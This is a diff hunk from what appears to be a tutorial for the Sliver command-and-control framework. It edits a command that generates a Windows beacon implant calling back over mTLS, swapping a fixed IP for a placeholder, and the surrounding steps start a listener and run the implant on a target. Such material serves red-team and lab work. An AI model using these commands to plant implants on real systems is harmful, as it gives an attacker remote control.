@@ -64,7 +64,7 @@ kali > sliver
 ```
 ②Generate a beacon implant for the Windows platform and enable mTLS monitoring with the specified IP address.
 ```
-sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save .
+sliver > generate beacon --arch amd64 --os  windows --mtls <Server IP> --save .
 sliver > mtls
 ```
 ③Download the sliver implant manually and execute it on the target machine.
